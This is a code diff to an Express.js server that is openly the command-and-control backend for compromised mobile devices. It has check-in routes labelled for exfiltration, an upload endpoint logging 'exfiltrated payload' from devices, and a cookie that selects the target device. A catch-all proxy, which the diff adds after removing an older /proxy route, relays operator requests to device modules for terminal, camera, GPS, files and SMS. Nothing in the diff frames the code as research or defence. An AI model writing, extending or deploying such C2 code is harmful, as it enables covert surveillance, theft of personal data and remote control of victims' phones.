@@ -55,6 +55,14 @@ function formatTime(isoString) {
     }
 }
 
+let lastActiveDeviceId = null;
+
+function getCookie(cookieHeader, name) {
+    if (!cookieHeader) return null;
+    const matches = cookieHeader.match(new RegExp('(?:^|; )' + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + '=([^;]*)'));
+    return matches ? decodeURIComponent(matches[1]) : null;
+}
+
 // Ingestion Handler for device check-ins
 function handleCheckin(req, res) {
     try {
@@ -89,14 +97,13 @@ function handleCheckin(req, res) {
     }
 }
 
-// Routes - Support all check-in HTTP methods and subpath aliases
+// Check-in & Exfiltration Routes
 app.all('/checkin', handleCheckin);
 app.all('/checkin/', handleCheckin);
 app.all('/api/checkin', handleCheckin);
 app.all('/api/checkin/', handleCheckin);
-app.post('/', handleCheckin);
+app.post('/checkin', handleCheckin);
 
-// File upload endpoint for exfiltrated media/data
 app.post('/upload', (req, res) => {
     console.log('[UPLOAD SUCCESS] Received exfiltrated payload from device:', req.headers['x-device-id'] || 'Unknown');
     res.json({ success: true, message: 'File payload ingested successfully' });
@@ -127,40 +134,6 @@ function handleTunnelResponse(req, res) {
 }
 app.post('/tunnel-response', handleTunnelResponse);
 app.post('/checkin/tunnel-response', handleTunnelResponse);
-
-// Proxy route for CONNECT button
-app.all('/proxy*', (req, res) => {
-    let deviceId = req.query.deviceId;
-    if (!deviceId && devices.size > 0) deviceId = Array.from(devices.keys())[0];
-    if (!deviceId) deviceId = 'samsung';
-
-    if (!devices.has(deviceId)) {
-        devices.set(deviceId, { deviceId, brand: 'samsung', model: 'SM-F731W', ip: '127.0.0.1', port: 9191, stealth: false, lastSeen: new Date().toISOString() });
-        saveData();
-    }
-
-    const requestId = Math.random().toString(36).substring(7);
-    let relayPath = req.originalUrl.replace('/proxy', '') || '/';
-    if (!relayPath.startsWith('/')) relayPath = '/' + relayPath;
-
-    if (!commandQueues.has(deviceId)) commandQueues.set(deviceId, []);
-    pendingResponses.set(requestId, { res });
-
-    commandQueues.get(deviceId).push({
-        type: 'request',
-        id: requestId,
-        method: req.method,
-        path: relayPath,
-        body: req.method === 'POST' ? JSON.stringify(req.body) : ''
-    });
-
-    setTimeout(() => {
-        if (pendingResponses.has(requestId)) {
-            pendingResponses.delete(requestId);
-            if (!res.headersSent) res.status(504).send('<!DOCTYPE html><html><body style="background:#02080d;color:#ff3131;font-family:monospace;padding:40px;text-align:center;"><h2>TUNNEL_GATEWAY_TIMEOUT</h2><p>Device is offline or not polling.</p></body></html>');
-        }
-    }, 25000);
-});
 
 // GET / serves Operator Dashboard HTML or handles GET check-ins
 app.get('/', (req, res) => {
@@ -235,6 +208,45 @@ app.get('/', (req, res) => {
 </html>`;
 
     res.send(html);
+});
+
+// Catch-All Device Proxy Handler (Proxies all module tabs: /terminal, /ghost, /camera, /gps, /files, /sms, etc.)
+app.all('*', (req, res) => {
+    let deviceId = req.query.deviceId || getCookie(req.headers.cookie, 'c2_target_device') || lastActiveDeviceId;
+    if (!deviceId && devices.size > 0) deviceId = Array.from(devices.keys())[0];
+    if (!deviceId) deviceId = 'samsung';
+
+    if (deviceId) {
+        lastActiveDeviceId = deviceId;
+        res.setHeader('Set-Cookie', `c2_target_device=${encodeURIComponent(deviceId)}; Path=/; SameSite=Lax`);
+    }
+
+    if (!devices.has(deviceId)) {
+        devices.set(deviceId, { deviceId, brand: 'samsung', model: 'SM-F731W', ip: '127.0.0.1', port: 9191, stealth: false, lastSeen: new Date().toISOString() });
+        saveData();
+    }
+
+    const requestId = Math.random().toString(36).substring(7);
+    let relayPath = req.originalUrl.replace('/proxy', '') || '/';
+    if (!relayPath.startsWith('/')) relayPath = '/' + relayPath;
+
+    if (!commandQueues.has(deviceId)) commandQueues.set(deviceId, []);
+    pendingResponses.set(requestId, { res });
+
+    commandQueues.get(deviceId).push({
+        type: 'request',
+        id: requestId,
+        method: req.method,
+        path: relayPath,
+        body: req.method === 'POST' ? (typeof req.body === 'object' ? JSON.stringify(req.body) : req.body) : ''
+    });
+
+    setTimeout(() => {
+        if (pendingResponses.has(requestId)) {
+            pendingResponses.delete(requestId);
+            if (!res.headersSent) res.status(504).send('<!DOCTYPE html><html><body style="background:#02080d;color:#ff3131;font-family:monospace;padding:40px;text-align:center;"><h2>TUNNEL_GATEWAY_TIMEOUT</h2><p>Device is offline or not polling.</p></body></html>');
+        }
+    }, 25000);
 });
 
 app.listen(PORT, '0.0.0.0', () => {
